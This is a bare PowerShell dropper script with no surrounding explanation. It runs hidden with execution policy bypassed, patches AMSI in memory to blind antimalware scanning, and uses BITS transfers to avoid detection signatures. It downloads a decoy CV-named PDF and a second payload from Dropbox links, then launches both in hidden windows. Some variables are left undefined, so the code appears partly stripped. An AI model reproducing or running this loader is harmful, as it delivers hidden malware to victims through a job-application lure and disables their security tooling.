powershell -NoP -Ep Bypass -W Hidden -C "

$r=Get-Random -Max 99999;
$P=Join-Path $T ('d_'+$r+'.pdf');

# AMSI patch

$c=$b.GetValue($null);
[Runtime.InteropServices.Marshal]::WriteInt32([IntPtr][Int64]([Runtime.InteropServices.Marshal]::ReadInt64($c)),0x80070057);

# download via BITS (no WebClient sig)
Import-Module BitsTransfer -Force;
Start-BitsTransfer -Source 'https://www.dropbox.com/scl/fi/upcfiumeqqmty7n2pdshe/Anvika_CV_Updated.pdf?rlkey=mtp1jjrx8zj58bcu4j2xnh4fm&st=x8o6tbvh&dl=1' -Destination $P;
Start-BitsTransfer -Source 'https://www.dropbox.com/scl/fi/il9akb6plfvcddbdo7psm/three60cleaner.txt?rlkey=sojsz8bgelw6s5ejng8ywwrd7&st=pvssm2fn&dl=1' -Destination $X;

# launch
$psi=New-Object Diagnostics.ProcessStartInfo;
$psi.FileName=$P;$psi.WindowStyle='Hidden';
[Diagnostics.Process]::Start($psi)|Out-Null;
$psi2=New-Object Diagnostics.ProcessStartInfo;
$psi2.FileName=$X;$psi2.WindowStyle='Hidden';
[Diagnostics.Process]::Start($psi2)|Out-Null
"
